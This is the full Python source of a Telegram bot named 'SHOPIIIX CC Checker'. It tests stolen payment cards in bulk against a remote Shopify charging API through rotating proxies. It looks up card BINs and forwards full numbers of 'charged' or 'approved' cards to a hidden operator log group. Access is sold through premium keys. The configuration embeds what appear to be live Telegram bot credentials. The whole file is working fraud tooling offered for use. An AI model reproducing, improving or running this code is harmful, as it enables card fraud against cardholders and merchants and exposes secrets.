#!/usr/bin/env python3

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
import asyncio, aiohttp, aiofiles, os, random, time, json, re, secrets, string
from datetime import datetime, timedelta

# ═══════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════

BOT_TOKEN   = '8692888647:AAGBRVuhOBnNe5jIi71o7sLBAYOY6JBsevQ'
API_ID      = 32253547
API_HASH    = '868242502bea6a1e41b2ce46001d0580'
CHECKER_API = 'https://web-production-1b828.up.railway.app/shopify'
OWNER_ID    = 5895386985
LOGS_GROUP  = -1003769047965

PREMIUM_FILE = 'premium_users.json'
PROXY_FILE   = 'proxies.txt'
KEYS_FILE    = 'keys.json'

# ═══════════════════════════════════════════════
#  DATA HELPERS
# ═══════════════════════════════════════════════

def _load(path, default=None):
    if not os.path.exists(path):
        return default if default is not None else {}
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except:
        return default if default is not None else {}

def _save(path, data):
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

# ── Premium ──

def is_premium(uid):
    if uid == OWNER_ID:
        return True
    data = _load(PREMIUM_FILE)
    info = data.get(str(uid))
    if not info:
        return False
    exp = info.get('expires')
    if exp is None:
        return True
    return datetime.fromisoformat(exp) > datetime.now()

def add_premium(uid, days=0):
    data = _load(PREMIUM_FILE)
    exp = None
    if days > 0:
        exp = (datetime.now() + timedelta(days=days)).isoformat()
    data[str(uid)] = {'expires': exp, 'added': datetime.now().isoformat()}
    _save(PREMIUM_FILE, data)

def remove_premium(uid):
    data = _load(PREMIUM_FILE)
    data.pop(str(uid), None)
    _save(PREMIUM_FILE, data)

def premium_expiry(uid):
    data = _load(PREMIUM_FILE)
    info = data.get(str(uid))
    if not info:
        return None
    exp = info.get('expires')
    if exp is None:
        return "Lifetime"
    dt = datetime.fromisoformat(exp)
    left = (dt - datetime.now()).days
    return f"{dt.strftime('%Y-%m-%d')} ({left}d left)"

def list_premium_users():
    return _load(PREMIUM_FILE)

# ── Keys ──

def gen_key_string():
    c = string.ascii_uppercase + string.digits
    return 'SH-' + '-'.join(''.join(secrets.choice(c) for _ in range(4)) for _ in range(4))

def create_keys(count, days):
    data = _load(KEYS_FILE)
    keys = []
    for _ in range(count):
        k = gen_key_string()
        data[k] = {'days': days, 'used': False, 'by': None, 'created': datetime.now().isoformat()}
        keys.append(k)
    _save(KEYS_FILE, data)
    return keys

def redeem_key(uid, key):
    data = _load(KEYS_FILE)
    k = data.get(key)
    if not k:
        return None, "Key not found"
    if k['used']:
        return None, "Key already redeemed"
    days = k['days']
    k['used'] = True
    k['by'] = uid
    k['redeemed'] = datetime.now().isoformat()
    _save(KEYS_FILE, data)
    add_premium(uid, days)
    return days, "OK"

# ── Proxies ──

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, 'r') as f:
        return [l.strip() for l in f if l.strip()]

def save_proxies(lst):
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(lst) + '\n')

def pick_proxy():
    p = load_proxies()
    return random.choice(p) if p else ''

# ── Cards ──

def parse_cards(text):
    found = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    cards = []
    for num, mm, yy, cvv in found:
        if len(yy) == 2:
            yy = '20' + yy
        cards.append(f'{num}|{mm}|{yy}|{cvv}')
    return cards

# ═══════════════════════════════════════════════
#  CHECKER ENGINE — REAL API CALLS
# ═══════════════════════════════════════════════

async def check_card(card, proxy=''):
    try:
        params = {'cc': card}
        if proxy:
            params['proxy'] = proxy
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(CHECKER_API, params=params) as r:
                raw_text = await r.text()
                try:
                    d = json.loads(raw_text)
                except:
                    return {'result': 'ERROR', 'gate': '-', 'price': '-', 'site': '-',
                            'time': '-', 'receipt': '', 'response': 'PARSE_ERROR',
                            'detail': raw_text[:300]}

        resp    = str(d.get('Response', '')).upper()
        gate    = d.get('Gate', 'Shopify')
        price   = d.get('Price', '-')
        site    = d.get('Site', '-')
        elapsed = d.get('Time', '-')
        receipt = d.get('Receipt', '')
        msg     = d.get('Message', '')
        status  = d.get('Status', '')
        err     = d.get('ErrorDetail', '')
        detail  = err or status or msg or resp
        charged = str(d.get('Charged', 'False')).lower() == 'true'
        approved = str(d.get('Approved', 'False')).lower() == 'true'

        base = {'gate': gate, 'price': price, 'site': site,
                'time': elapsed, 'receipt': receipt, 'response': resp, 'detail': detail}

        if charged or 'CHARGED' in resp:
            return {**base, 'result': 'CHARGED'}
        if approved or 'APPROVED' in resp:
            return {**base, 'result': 'APPROVED'}
        if any(w in resp for w in ('DECLINE', 'DO NOT HONOR', 'INSUFFICIENT',
                                    'INVALID', 'STOLEN', 'LOST', 'EXPIRED',
                                    'PICKUP', 'BLOCKED', 'RESTRICTED', 'FRAUD',
                                    'EXCEEDS', 'NOT PERMITTED', 'SECURITY')):
            return {**base, 'result': 'DECLINED'}
        return {**base, 'result': 'DECLINED', 'detail': detail or raw_text[:200]}

    except asyncio.TimeoutError:
        return {'result': 'TIMEOUT', 'gate': '-', 'price': '-', 'site': '-',
                'time': '-', 'receipt': '', 'response': 'TIMEOUT', 'detail': 'Request timed out'}
    except Exception as e:
        return {'result': 'ERROR', 'gate': '-', 'price': '-', 'site': '-',
                'time': '-', 'receipt': '', 'response': 'ERROR', 'detail': str(e)[:200]}

async def bin_lookup(card):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{card[:6]}') as r:
                if r.status == 200:
                    return await r.json()
    except:
        pass
    return {}

# ═══════════════════════════════════════════════
#  FORWARD HITS TO LOG GROUP
# ═══════════════════════════════════════════════

async def forward_hit(card, res, uid, bi=None):
    bi = bi or {}
    tag = '💎 CHARGED' if res['result'] == 'CHARGED' else '✅ APPROVED'
    txt = (
        f"<b>{tag}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>CC:</b>  <code>{card}</code>\n"
        f"<b>Gate:</b>  {res['gate']}\n"
        f"<b>Price:</b> {res['price']}\n"
        f"<b>Site:</b>  {res['site']}\n"
        f"<b>Time:</b>  {res['time']}\n"
        f"<b>Bank:</b>  {bi.get('bank','—')}\n"
        f"<b>Brand:</b> {bi.get('brand','—')} {bi.get('country_flag','')}\n"
        f"<b>User:</b>  <code>{uid}</code>"
    )
    if res['result'] == 'CHARGED' and res.get('receipt'):
        txt += f"\n<b>Receipt:</b> {res['receipt']}"
    try:
        await bot.send_message(LOGS_GROUP, txt, parse_mode='html')
    except:
        pass

# ═══════════════════════════════════════════════
#  BOT INIT
# ═══════════════════════════════════════════════

SESSION_STRING = os.environ.get('SESSION_STRING', '')
_sess = StringSession(SESSION_STRING) if SESSION_STRING else StringSession()
bot = TelegramClient(_sess, API_ID, API_HASH).start(bot_token=BOT_TOKEN)

if not SESSION_STRING:
    saved = bot.session.save()
    print('\n' + '='*60)
    print('SESSION_STRING not set — copy this to Railway Variables:')
    print('='*60)
    print(saved)
    print('='*60 + '\n')

sessions = {}

# ═══════════════════════════════════════════════
#  /start
# ═══════════════════════════════════════════════

@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(e):
    uid  = e.sender_id
    prem = is_premium(uid)
    exp  = premium_expiry(uid)
    tag  = '✅ Premium' if prem else '❌ Free'
    exp_line = f'\n<b>Expires:</b> {exp}' if exp else ''

    buttons = [
        [Button.inline('📋 Commands', b'cmd_help'),
         Button.inline('👤 Profile', b'profile')],
        [Button.inline('🌐 Proxy', b'proxy_menu'),
         Button.inline('📊 Status', b'api_check')],
        [Button.inline('🔑 Redeem Key', b'redeem_help')],
    ]

    await e.reply(
        f"<b>⚡ SHOPIIIX ─ CC Checker</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>ID:</b>     <code>{uid}</code>\n"
        f"<b>Plan:</b>   {tag}{exp_line}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>/cc</b>  — Check single card\n"
        f"<b>/chk</b> — Check .txt file\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode='html', buttons=buttons
    )

# ═══════════════════════════════════════════════
#  /cc  — SINGLE CHECK
# ═══════════════════════════════════════════════

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def cmd_cc(e):
    uid = e.sender_id
    if not is_premium(uid):
        return await e.reply('<b>⛔ Premium required.</b> Use /redeem KEY', parse_mode='html')

    raw = e.message.text.split(maxsplit=1)[1].strip()
    if not re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', raw):
        return await e.reply(
            '<b>Format:</b> <code>/cc CARD|MM|YY|CVV</code>\n'
            '<b>Example:</b> <code>/cc 4111111111111111|12|25|123</code>',
            parse_mode='html')

    msg = await e.reply('<b>Checking...</b>', parse_mode='html')

    res = await check_card(raw, pick_proxy())
    bi  = await bin_lookup(raw.split('|')[0])

    num    = raw.split('|')[0]
    masked = f'{num[:6]}xxxxxx{num[-4:]}'

    r = res['result']
    if r == 'CHARGED':
        icon, label = '💎', 'CHARGED — Order Placed'
    elif r == 'APPROVED':
        icon, label = '✅', 'APPROVED — CCN Live'
    elif r == 'DECLINED':
        icon, label = '❌', 'DECLINED'
    elif r == 'TIMEOUT':
        icon, label = '⏳', 'TIMEOUT'
    else:
        icon, label = '⚠️', 'ERROR'

    out = (
        f"<b>{icon} {label}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Card:</b>    <code>{masked}</code>\n"
        f"<b>Gate:</b>    {res['gate']}\n"
        f"<b>Price:</b>   {res['price']}\n"
        f"<b>Site:</b>    {res['site']}\n"
        f"<b>Time:</b>    {res['time']}\n\n"
        f"<b>── BIN ──</b>\n"
        f"<b>Bank:</b>    {bi.get('bank','—')}\n"
        f"<b>Brand:</b>   {bi.get('brand','—')} {bi.get('country_flag','')}\n"
        f"<b>Country:</b> {bi.get('country_name','—')}\n"
        f"<b>Type:</b>    {bi.get('type','—')} | {bi.get('level','—')}\n\n"
        f"<b>── Response ──</b>\n"
        f"<code>{(res.get('detail') or res.get('response') or '-')[:200]}</code>"
    )

    if r == 'CHARGED' and res.get('receipt'):
        out += f"\n\n<b>Receipt:</b> {res['receipt']}"

    await msg.edit(out, parse_mode='html')

    if r in ('CHARGED', 'APPROVED'):
        await forward_hit(raw, res, uid, bi)

# ═══════════════════════════════════════════════
#  /chk  — BATCH CHECK FROM .TXT FILE
# ═══════════════════════════════════════════════

@bot.on(events.NewMessage(pattern=r'^/chk'))
async def cmd_chk(e):
    uid = e.sender_id
    if not is_premium(uid):
        return await e.reply('<b>⛔ Premium required.</b>', parse_mode='html')

    if not e.reply_to_msg_id:
        return await e.reply('<b>Reply to a .txt file with /chk</b>', parse_mode='html')

    reply = await e.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        return await e.reply('<b>File must be .txt</b>', parse_mode='html')

    msg  = await e.reply('<b>Loading file...</b>', parse_mode='html')
    path = await reply.download_media()

    try:
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            text = await f.read()

        cards = parse_cards(text)
        if not cards:
            return await msg.edit('<b>No valid cards in file.</b>', parse_mode='html')

        total = min(len(cards), 500000)
        stat  = {'charged': 0, 'approved': 0, 'declined': 0, 'error': 0,
                 'done': 0, 't0': time.time()}
        hits  = []

        sid = f'{uid}_{msg.id}'
        sessions[sid] = {'pause': False, 'stop': False}

        btns = [[Button.inline('⏸ Pause', f'p_{sid}'.encode()),
                 Button.inline('🛑 Stop', f's_{sid}'.encode())]]

        for card in cards[:total]:
            if sid not in sessions or sessions[sid]['stop']:
                break
            while sessions.get(sid, {}).get('pause'):
                await asyncio.sleep(1)

            res = await check_card(card, pick_proxy())
            r   = res['result']

            if r == 'CHARGED':
                stat['charged'] += 1
                hits.append(f"💎 {card} | {res['site']} | {res['price']}")
                await forward_hit(card, res, uid)
            elif r == 'APPROVED':
                stat['approved'] += 1
                hits.append(f"✅ {card} | {res['site']}")
                await forward_hit(card, res, uid)
            elif r == 'DECLINED':
                stat['declined'] += 1
            else:
                stat['error'] += 1

            stat['done'] += 1

            if stat['done'] % 10 == 0:
                pct = int(stat['done'] / total * 100)
                bar = '█' * (pct // 10) + '░' * (10 - pct // 10)
                sec = int(time.time() - stat['t0'])
                await msg.edit(
                    f"<b>⚡ Checking...</b>\n\n"
                    f"[{bar}] {pct}%\n"
                    f"<b>Done:</b> {stat['done']}/{total}\n\n"
                    f"💎 {stat['charged']}  ✅ {stat['approved']}  "
                    f"❌ {stat['declined']}  ⚠️ {stat['error']}\n\n"
                    f"<b>Time:</b> {sec}s",
                    parse_mode='html', buttons=btns
                )

        sec = int(time.time() - stat['t0'])
        final = (
            f"<b>✅ Batch Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>Total:</b>   {total}\n"
            f"<b>Checked:</b> {stat['done']}\n\n"
            f"💎 Charged:  {stat['charged']}\n"
            f"✅ Approved: {stat['approved']}\n"
            f"❌ Declined: {stat['declined']}\n"
            f"⚠️ Errors:   {stat['error']}\n\n"
            f"<b>Time:</b> {sec}s"
        )
        if hits:
            final += '\n\n<b>── Hits ──</b>\n' + '\n'.join(hits[:30])
        await msg.edit(final, parse_mode='html')
        sessions.pop(sid, None)

    except Exception as ex:
        await msg.edit(f'<b>Error:</b> <code>{str(ex)[:150]}</code>', parse_mode='html')
    finally:
        if os.path.exists(path):
            os.remove(path)

# ═══════════════════════════════════════════════
#  PAUSE / STOP BATCH
# ═══════════════════════════════════════════════

@bot.on(events.CallbackQuery(pattern=rb'p_(.+)'))
async def cb_pause(e):
    sid = e.data.decode()[2:]
    if sid in sessions:
        sessions[sid]['pause'] = not sessions[sid]['pause']
        await e.answer('⏸ Paused' if sessions[sid]['pause'] else '▶ Resumed')

@bot.on(events.CallbackQuery(pattern=rb's_(.+)'))
async def cb_stop(e):
    sid = e.data.decode()[2:]
    if sid in sessions:
        sessions[sid]['stop'] = True
        sessions.pop(sid, None)
    await e.answer('🛑 Stopped')

# ═══════════════════════════════════════════════
#  CALLBACKS — MENUS
# ═══════════════════════════════════════════════

@bot.on(events.CallbackQuery(pattern=b'cmd_help'))
async def cb_cmds(e):
    await e.edit(
        "<b>📋 All Commands</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>User Commands:</b>\n"
        "/start — Main menu\n"
        "/cc CARD|MM|YY|CVV — Single check\n"
        "/chk — Batch check (reply to .txt)\n"
        "/redeem KEY — Redeem premium key\n\n"
        "<b>Owner Commands:</b>\n"
        "/genkey COUNT DAYS — Generate keys\n"
        "/addprem UID DAYS — Add premium\n"
        "/rmprem UID — Remove premium\n"
        "/listprem — List premium users\n"
        "/addproxy — Add proxies\n"
        "/clearproxy — Clear all proxies\n"
        "/broadcast MSG — Send to all users",
        parse_mode='html',
        buttons=[[Button.inline('🔙 Back', b'back')]]
    )
    await e.answer()

@bot.on(events.CallbackQuery(pattern=b'profile'))
async def cb_profile(e):
    uid  = e.sender_id
    prem = is_premium(uid)
    exp  = premium_expiry(uid)
    tag  = '✅ Premium' if prem else '❌ Free'
    exp_line = f'\n<b>Expires:</b> {exp}' if exp else ''

    await e.edit(
        f"<b>👤 My Profile</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>ID:</b>   <code>{uid}</code>\n"
        f"<b>Plan:</b> {tag}{exp_line}\n\n"
        f"<b>Proxies loaded:</b> {len(load_proxies())}",
        parse_mode='html',
        buttons=[[Button.inline('🔙 Back', b'back')]]
    )
    await e.answer()

@bot.on(events.CallbackQuery(pattern=b'proxy_menu'))
async def cb_proxy(e):
    n = len(load_proxies())
    await e.edit(
        f"<b>🌐 Proxy Manager</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Loaded:</b> {n} proxies\n\n"
        f"<b>Add:</b>\n"
        f"<code>/addproxy\n"
        f"ip:port:user:pass\n"
        f"ip:port:user:pass</code>\n\n"
        f"<b>Clear:</b> <code>/clearproxy</code>",
        parse_mode='html',
        buttons=[[Button.inline('🔙 Back', b'back')]]
    )
    await e.answer()

@bot.on(events.CallbackQuery(pattern=b'api_check'))
async def cb_api(e):
    await e.answer('Checking...')
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
            async with s.get(CHECKER_API.replace('/shopify', '/health')) as r:
                ok = r.status == 200
    except:
        ok = False
    st = '✅ ONLINE' if ok else '❌ OFFLINE'
    await e.edit(
        f"<b>📊 API Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Checker:</b> {st}\n"
        f"<b>API:</b> <code>{CHECKER_API}</code>",
        parse_mode='html',
        buttons=[[Button.inline('🔙 Back', b'back')]]
    )

@bot.on(events.CallbackQuery(pattern=b'redeem_help'))
async def cb_redeem(e):
    await e.edit(
        "<b>🔑 Redeem Key</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send in chat:\n"
        "<code>/redeem YOUR-KEY-HERE</code>\n\n"
        "Get a key from the bot owner.",
        parse_mode='html',
        buttons=[[Button.inline('🔙 Back', b'back')]]
    )
    await e.answer()

@bot.on(events.CallbackQuery(pattern=b'back'))
async def cb_back(e):
    await e.answer()
    await e.delete()
    await e.respond('/start')

# ═══════════════════════════════════════════════
#  OWNER COMMANDS
# ═══════════════════════════════════════════════

def owner_only(func):
    async def wrapper(e):
        if e.sender_id != OWNER_ID:
            return await e.reply('<b>⛔ Owner only</b>', parse_mode='html')
        return await func(e)
    return wrapper

# /genkey COUNT DAYS
@bot.on(events.NewMessage(pattern=r'^/genkey'))
@owner_only
async def cmd_genkey(e):
    parts = e.message.text.strip().split()
    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
    days  = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
    count = min(count, 50)
    keys  = create_keys(count, days)
    dur   = f'{days} days' if days > 0 else 'Lifetime'
    lines = '\n'.join(f'<code>{k}</code>' for k in keys)
    await e.reply(
        f"<b>🔑 Keys Generated</b>\n\n"
        f"<b>Count:</b> {count}\n"
        f"<b>Duration:</b> {dur}\n\n{lines}",
        parse_mode='html')

# /addprem UID [DAYS]
@bot.on(events.NewMessage(pattern=r'^/addprem'))
@owner_only
async def cmd_addprem(e):
    parts = e.message.text.strip().split()
    if len(parts) < 2:
        return await e.reply('<b>Usage:</b> <code>/addprem USER_ID [DAYS]</code>', parse_mode='html')
    uid  = int(parts[1])
    days = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
    add_premium(uid, days)
    dur = f'{days} days' if days > 0 else 'Lifetime'
    await e.reply(f'<b>✅ Premium added</b>\n<b>User:</b> <code>{uid}</code>\n<b>Duration:</b> {dur}', parse_mode='html')

# /rmprem UID
@bot.on(events.NewMessage(pattern=r'^/rmprem'))
@owner_only
async def cmd_rmprem(e):
    parts = e.message.text.strip().split()
    if len(parts) < 2:
        return await e.reply('<b>Usage:</b> <code>/rmprem USER_ID</code>', parse_mode='html')
    uid = int(parts[1])
    remove_premium(uid)
    await e.reply(f'<b>✅ Premium removed for</b> <code>{uid}</code>', parse_mode='html')

# /listprem
@bot.on(events.NewMessage(pattern=r'^/listprem'))
@owner_only
async def cmd_listprem(e):
    data = list_premium_users()
    if not data:
        return await e.reply('<b>No premium users</b>', parse_mode='html')
    lines = []
    for uid, info in data.items():
        exp = info.get('expires')
        tag = 'Lifetime' if exp is None else datetime.fromisoformat(exp).strftime('%Y-%m-%d')
        lines.append(f'<code>{uid}</code> — {tag}')
    await e.reply('<b>👑 Premium Users</b>\n\n' + '\n'.join(lines), parse_mode='html')

# /addproxy
@bot.on(events.NewMessage(pattern=r'^/addproxy'))
@owner_only
async def cmd_addproxy(e):
    text  = e.message.text.replace('/addproxy', '').strip()
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines:
        return await e.reply(
            '<b>Usage:</b>\n<code>/addproxy\nip:port:user:pass\nip:port:user:pass</code>',
            parse_mode='html')
    cur   = load_proxies()
    added = 0
    for l in lines:
        if l not in cur:
            cur.append(l)
            added += 1
    save_proxies(cur)
    await e.reply(f'<b>✅ Added {added} proxies (total: {len(cur)})</b>', parse_mode='html')

# /clearproxy
@bot.on(events.NewMessage(pattern=r'^/clearproxy'))
@owner_only
async def cmd_clearproxy(e):
    save_proxies([])
    await e.reply('<b>✅ All proxies cleared</b>', parse_mode='html')

# /broadcast
@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
@owner_only
async def cmd_broadcast(e):
    text = e.message.text.split(maxsplit=1)[1]
    data = list_premium_users()
    sent = 0
    for uid in data:
        try:
            await bot.send_message(int(uid), f'<b>📢 Broadcast</b>\n\n{text}', parse_mode='html')
            sent += 1
        except:
            pass
    await e.reply(f'<b>✅ Sent to {sent}/{len(data)} users</b>', parse_mode='html')

# ═══════════════════════════════════════════════
#  /redeem KEY
# ═══════════════════════════════════════════════

@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def cmd_redeem(e):
    uid = e.sender_id
    key = e.message.text.split(maxsplit=1)[1].strip().upper()

    if is_premium(uid):
        return await e.reply('<b>✅ You already have premium!</b>', parse_mode='html')

    days, status = redeem_key(uid, key)
    if status != 'OK':
        return await e.reply(f'<b>❌ {status}</b>', parse_mode='html')

    dur = f'{days} days' if days > 0 else 'Lifetime'
    exp = premium_expiry(uid)
    await e.reply(
        f"<b>✅ Key Redeemed!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Plan:</b>    {dur}\n"
        f"<b>Expires:</b> {exp}\n\n"
        f"Commands unlocked:\n"
        f"/cc — Single check\n"
        f"/chk — Batch check",
        parse_mode='html')

    try:
        await bot.send_message(OWNER_ID,
            f"<b>🔑 Key Redeemed</b>\n<b>Key:</b> <code>{key}</code>\n"
            f"<b>User:</b> <code>{uid}</code>\n<b>Duration:</b> {dur}",
            parse_mode='html')
    except:
        pass

# ═══════════════════════════════════════════════
#  START
# ═══════════════════════════════════════════════

print('\n⚡ SHOPIIIX Bot Active')
print(f'🌐 API: {CHECKER_API}')
print(f'📡 Proxies: {len(load_proxies())}')
print(f'👑 Owner: {OWNER_ID}\n')

bot.run_until_disconnected()
